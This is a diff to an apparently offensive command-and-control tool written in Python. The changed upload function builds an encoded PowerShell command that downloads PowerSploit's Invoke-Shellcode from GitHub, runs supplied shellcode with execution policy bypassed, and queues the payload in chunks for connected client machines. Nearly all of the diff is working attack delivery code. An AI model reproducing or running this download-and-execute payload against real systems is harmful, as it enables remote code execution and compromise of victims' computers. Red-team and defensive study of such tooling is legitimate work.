@@ -97,17 +97,37 @@ def checkPayloadLength(payload):
     return splitPayload
 
 
-def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
+def checkUpload():
     from menu import clientMenuOptions
-    clientnumber = int(clientnumber)
+    use_client_upload = raw_input('[?] Upload Using Client Connection? [y]/n: ')
+    if use_client_upload.lower() == 'y' or use_client_upload == '':
+        for i in clientMenuOptions.keys():
+            if i == 'back' or i == 'r':
+                pass
+            else:
+                print t.bold_yellow + i + t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.normal + '\n'
+        while True:
+            clientchoice = raw_input('>> ')
+            try:
+                return int(clientMenuOptions[clientchoice]['params'])
+            except:
+                continue
+    return False
 
-    if isExe:
-        newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
-        encPowershell = "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
-        encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
-        fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
-        b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
-        lenb64 = len(b64Exec)
+def clientUpload(fileToUpload, powershellExec, isExe, json):
+    clientnumber = checkUpload()
+    if clientnumber:
+        if isExe:
+            newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
+            encPowershell = "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
+            encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
+            fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
+            b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
+            lenb64 = len(b64Exec)
+        else:
+            b64Exec = base64.b64encode(powershellExec.encode('UTF-16LE'))
+            lenb64 = len(b64Exec)
+
 
         splitPayoad = checkPayloadLength(b64Exec)
 
@@ -115,18 +135,19 @@ def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
             for p in splitPayoad:
                 for server in serverlist:
                     if clientnumber in server.handlers.keys():
-                        server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}' % (p))
+                        server.handlers[clientnumber].out_buffer.append(json % (p))
                         time.sleep(0.5)
             print "sending exec packet!"
             time.sleep(0.5)
             for server in serverlist:
                 if clientnumber in server.handlers.keys():
                     server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":"false", "multiple":"exec"}')
-
         else:
-            powershellExec = '{"type":"", "data":"%s", "sendoutput":"false", "multiple":""}' % (b64Exec)
+            for server in serverlist:
+                if clientnumber in server.handlers.keys():
+                    server.handlers[clientnumber].out_buffer.append(json % (b64Exec))
+
+        return clientnumber
+
     else:
-        for server in serverlist:
-            if clientnumber in server.handlers.keys():
-                server.handlers[clientnumber].out_buffer.append(powershellExec)
-    return clientnumber
+        return False
